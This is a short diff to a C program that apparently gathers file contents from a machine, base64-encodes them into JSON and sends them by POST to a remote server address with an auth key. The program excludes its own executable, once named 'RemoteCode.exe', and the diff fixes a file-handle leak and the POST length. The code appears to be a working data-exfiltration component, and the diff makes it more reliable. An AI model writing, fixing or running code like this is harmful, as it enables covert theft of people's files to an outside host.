@@ -175,8 +175,8 @@ char* spill_file_json(char** file_names, int size, int* json_length)
         FILE* read_file = fopen(file_names[i], "rb");
 
         // Let's actually make sure the file exists. If it doesn't, continue.
-        // Also, prevent RemoteCode.exe from being read
-        if (read_file == NULL || strcmp(file_names[i], "RemoteCode.exe") == 0)
+        // Also, prevent ls_read.exe from being read
+        if (read_file == NULL || strcmp(file_names[i], "ls_read.exe") == 0)
         {
             continue;
         }
@@ -196,6 +196,8 @@ char* spill_file_json(char** file_names, int size, int* json_length)
         char* file_contents = malloc(file_contents_size + 1);       // We will transfer this over via strcat
         fread(file_contents, file_contents_size, 1, read_file);
         file_contents[file_contents_size] = '\0';                   // C doesn't automatically add null terminators to the end of fread, so we should do it manually ourselves
+
+        fclose(read_file);
 
         // Transferring binary data over JSON is a bit of a pain. Hence, we will encode it in base64
         // The base64 function requires us to preallocate the base64 string size
@@ -230,7 +232,8 @@ int main()
     // print_mem(json_str, json_length, TRUE);
 
     // Send it to the server
-    send_post_request(SVL_ADDRESS, json_str, json_length, "enumerator", SVL_AUTHKEY);
+    // Remember: JSON_LENGTH takes into account the null terminator. POST does not. Subtract 1 from this.
+    send_post_request(SVL_ADDRESS, json_str, json_length - 1, "enumerator", SVL_AUTHKEY);
 
     dealloc_str_arr(dir_names, size);
     free(json_str);
